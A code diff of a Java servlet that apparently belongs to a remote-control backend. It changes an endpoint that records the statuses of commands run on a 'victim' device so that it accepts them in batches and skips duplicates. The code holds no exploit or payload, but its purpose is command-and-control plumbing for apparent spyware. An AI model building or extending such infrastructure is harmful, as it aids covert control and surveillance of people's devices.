@@ -6,6 +6,8 @@ import com.theah64.xrob.api.models.Command;
 import com.theah64.xrob.api.utils.APIResponse;
 import com.theah64.xrob.api.utils.HeaderSecurity;
 import com.theah64.xrob.api.utils.Request;
+import org.json.JSONArray;
+import org.json.JSONObject;
 
 import javax.servlet.ServletException;
 import javax.servlet.annotation.WebServlet;
@@ -21,51 +23,61 @@ import java.io.PrintWriter;
 @WebServlet(urlPatterns = BaseServlet.VERSION_CODE + "/command/status/add")
 public class CommandStatusAddServlet extends BaseServlet {
 
-    private static final String[] REQUIRED_PARAMS = {
-            CommandStatuses.COLUMN_COMMAND_ID,
-            CommandStatuses.COLUMN_STATUS,
-            CommandStatuses.COLUMN_STATUS_MESSAGE};
+    private static final String[] REQUIRED_PARAMS = {KEY_DATA};
 
     protected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {
         response.setContentType(CONTENT_TYPE_JSON);
+
         final PrintWriter out = response.getWriter();
         try {
             final HeaderSecurity hs = new HeaderSecurity(request.getHeader(HeaderSecurity.KEY_AUTHORIZATION));
             final Request commandStatusAddRequest = new Request(request, REQUIRED_PARAMS);
-
             final String victimId = hs.getVictimId();
-            final String commandId = commandStatusAddRequest.getStringParameter(CommandStatuses.COLUMN_COMMAND_ID);
-            //is command exist
-            final boolean isCommandExistAndEstablishedForThisVictim = Commands.getInstance().isExist(Commands.COLUMN_ID, commandId, Commands.COLUMN_VICTIM_ID, victimId);
 
-            if (isCommandExistAndEstablishedForThisVictim) {
+            final JSONArray jaCommandStatuses = new JSONArray(commandStatusAddRequest.getStringParameter(KEY_DATA));
 
-                final String status = commandStatusAddRequest.getStringParameter(CommandStatuses.COLUMN_STATUS);
-                if (Command.Status.isValid(status)) {
+            final CommandStatuses cStatuesTable = CommandStatuses.getInstance();
 
-                    final boolean isStatusAdded = CommandStatuses.getInstance().add(new Command.Status(
-                            status,
-                            commandStatusAddRequest.getStringParameter(CommandStatuses.COLUMN_STATUS_MESSAGE),
-                            0,
-                            commandId
-                    ));
+            for (int i = 0; i < jaCommandStatuses.length(); i++) {
 
-                    if (isStatusAdded) {
-                        out.write(new APIResponse("Status added", null).toString());
+                final JSONObject joCommandStatus = jaCommandStatuses.getJSONObject(i);
+
+                final String commandId = joCommandStatus.getString(CommandStatuses.COLUMN_COMMAND_ID);
+                //is command exist
+                final boolean isCommandExistAndEstablishedForThisVictim = Commands.getInstance().isExist(Commands.COLUMN_ID, commandId, Commands.COLUMN_VICTIM_ID, victimId);
+
+                if (isCommandExistAndEstablishedForThisVictim) {
+
+                    final String status = joCommandStatus.getString(CommandStatuses.COLUMN_STATUS);
+
+                    if (Command.Status.isValid(status)) {
+
+                        final boolean isStatusAlreadyExists = cStatuesTable.isExist(CommandStatuses.COLUMN_COMMAND_ID, commandId, CommandStatuses.COLUMN_STATUS, status);
+
+                        final boolean isStatusAdded = isStatusAlreadyExists || cStatuesTable.add(new Command.Status(
+                                status,
+                                joCommandStatus.getString(CommandStatuses.COLUMN_STATUS_MESSAGE),
+                                0,
+                                commandId
+                        ));
+
+                        if (!isStatusAdded) {
+                            throw new IllegalArgumentException("Failed to add command status");
+                        }
+
                     } else {
-                        throw new IllegalArgumentException("Failed to add command status");
+                        throw new IllegalArgumentException("Invalid status : " + status);
                     }
 
+
                 } else {
-                    throw new IllegalArgumentException("Invalid status : " + status);
+                    throw new IllegalArgumentException("Command doesn't exist or not established for you");
                 }
-
-
-            } else {
-                throw new IllegalArgumentException("Command doesn't exist or not established for you");
             }
 
-            //is command established for victim
+            //Every thing's ok.
+            out.write(new APIResponse("Status added", null).toString());
+
 
         } catch (Exception e) {
             e.printStackTrace();
